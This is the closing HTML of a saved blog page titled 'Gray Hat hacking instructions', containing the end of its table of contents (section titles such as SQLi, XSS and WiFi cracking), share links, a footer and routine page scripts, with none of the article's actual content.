class="toc-text">CMS Scanners</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Subdomains"><span class="toc-number">3.7.</span> <span class="toc-text">Subdomains</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fuzzing-and-bruteforcing"><span class="toc-number">3.8.</span> <span class="toc-text">Fuzzing and bruteforcing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLi"><span class="toc-number">3.9.</span> <span class="toc-text">SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">3.10.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMTP"><span class="toc-number">3.11.</span> <span class="toc-text">SMTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WiFi-cracking"><span class="toc-number">3.12.</span> <span class="toc-text">WiFi cracking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compromised-machine"><span class="toc-number">3.13.</span> <span class="toc-text">Compromised machine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-number">3.14.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mobile"><span class="toc-number">3.15.</span> <span class="toc-text">Mobile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GitHub"><span class="toc-number">3.16.</span> <span class="toc-text">GitHub</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API"><span class="toc-number">3.17.</span> <span class="toc-text">API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI"><span class="toc-number">3.18.</span> <span class="toc-text">LFI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PCAP"><span class="toc-number">3.19.</span> <span class="toc-text">PCAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Other"><span class="toc-number">3.20.</span> <span class="toc-text">Other</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Additional-materials"><span class="toc-number">4.</span> <span class="toc-text">Additional materials</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://0ut3r.space/2024/07/12/hacking-instructions/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;text=Gray%20Hat%20hacking%20instructions"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;title=Gray%20Hat%20hacking%20instructions"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;is_video=false&amp;description=Gray%20Hat%20hacking%20instructions"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Gray Hat hacking instructions&amp;body=Check out this article: http://0ut3r.space/2024/07/12/hacking-instructions/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;title=Gray%20Hat%20hacking%20instructions"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;title=Gray%20Hat%20hacking%20instructions"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;title=Gray%20Hat%20hacking%20instructions"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;title=Gray%20Hat%20hacking%20instructions"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;name=Gray%20Hat%20hacking%20instructions&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;t=Gray%20Hat%20hacking%20instructions"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    ©
+    
+    
+    2018-2025
+    hoek
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/">Home</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/archives/">Post</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/projects/">Projects</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/categories/">Cats</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/badges/">Ⓑ</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/donations/">$</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/tos/">§</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/atom.xml">Rss</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link rel="stylesheet" href="Gray%20Hat%20hacking%20instructions_arquivos/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  <noscript><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+
+  
+<script src="Gray%20Hat%20hacking%20instructions_arquivos/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    
+<script src="Gray%20Hat%20hacking%20instructions_arquivos/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="Gray%20Hat%20hacking%20instructions_arquivos/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+
+
+</body></html>
